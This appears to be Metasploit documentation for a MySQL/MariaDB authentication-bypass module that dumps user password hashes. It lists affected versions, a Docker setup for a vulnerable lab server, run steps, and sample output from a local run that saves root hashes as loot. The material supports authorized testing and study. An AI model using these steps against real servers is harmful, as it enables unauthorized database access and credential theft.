## Description

This module exploits a password bypass vulnerability in MySQL in order
to extract the usernames and encrypted password hashes from a MySQL server.
These hashes are stored as loot for later cracking.

Impacts MySQL versions:
- 5.1.x before 5.1.63
- 5.5.x before 5.5.24
- 5.6.x before 5.6.6

And MariaDB versions:
- 5.1.x before 5.1.62
- 5.2.x before 5.2.12
- 5.3.x before 5.3.6
- 5.5.x before 5.5.23

## Environment Setup

### Docker

```
docker run -it --rm -p 3306:3306 vulhub/mysql:5.5.23
```

## Verification Steps

1. Do: `use scanner/mysql/mysql_authbypass_hashdump`
2. Do: `set RHOSTS [IP]`
3. Do: `run`

## Scenarios

```msf
msf6 auxiliary(scanner/mysql/mysql_authbypass_hashdump) > rerun rhost=127.0.0.1
[*] Reloading module...

[+] 127.0.0.1:3306        - 127.0.0.1:3306 The server allows logins, proceeding with bypass test
[*] 127.0.0.1:3306        - 127.0.0.1:3306 Authentication bypass is 10% complete
[+] 127.0.0.1:3306        - 127.0.0.1:3306 Successfully bypassed authentication after 130 attempts. URI: mysql://root:Gmg@127.0.0.1:3306
[+] 127.0.0.1:3306        - 127.0.0.1:3306 Successfully exploited the authentication bypass flaw, dumping hashes...
[+] 127.0.0.1:3306        - 127.0.0.1:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 127.0.0.1:3306        - 127.0.0.1:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 127.0.0.1:3306        - 127.0.0.1:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 127.0.0.1:3306        - 127.0.0.1:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 127.0.0.1:3306        - 127.0.0.1:3306 Saving HashString as Loot: root:*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[+] 127.0.0.1:3306        - 127.0.0.1:3306 Hash Table has been saved: /Users/adfoster/.msf4/loot/20230817230919_default_127.0.0.1_mysql.hashes_036424.txt
[*] 127.0.0.1:3306        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
